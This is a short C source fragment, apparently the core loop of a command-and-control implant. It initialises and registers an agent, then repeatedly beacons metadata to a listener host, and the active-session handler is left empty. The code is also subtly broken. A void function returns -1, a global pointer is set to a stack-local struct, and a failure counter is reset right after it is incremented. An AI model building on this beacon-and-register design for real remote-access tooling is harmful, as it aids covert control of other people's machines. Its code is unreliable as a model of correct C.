#include "agent.h"
#include "package.h"

pAgent agent = { 0 };

void AgentMain() {
	
	INT err;
	Agent Agent = { 0 };
	agent = &Agent;
	

	if ((err = init_agent()) != 0) {
		printf("[error] attempting to initialize agent\n");
		return -1;
	}

	
	if ((err = RegisterAgent()) != 0) {
		printf("[error] attempting to register agent\n");
		return -1;
	}


}

void AgentRoutine() {
	while (TRUE) {
		if (!agent->session->Active)
		{
			if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL)) != PACKAGE_SUCCESS) {
				printf("[error] attempting to send package\n");
				agent->config->listenerConfig->CurrentHost->NumFailures++;
			}
			agent->config->listenerConfig->CurrentHost->NumFailures = 0;
		}

		if (agent->session->Active) {

		}
	}
}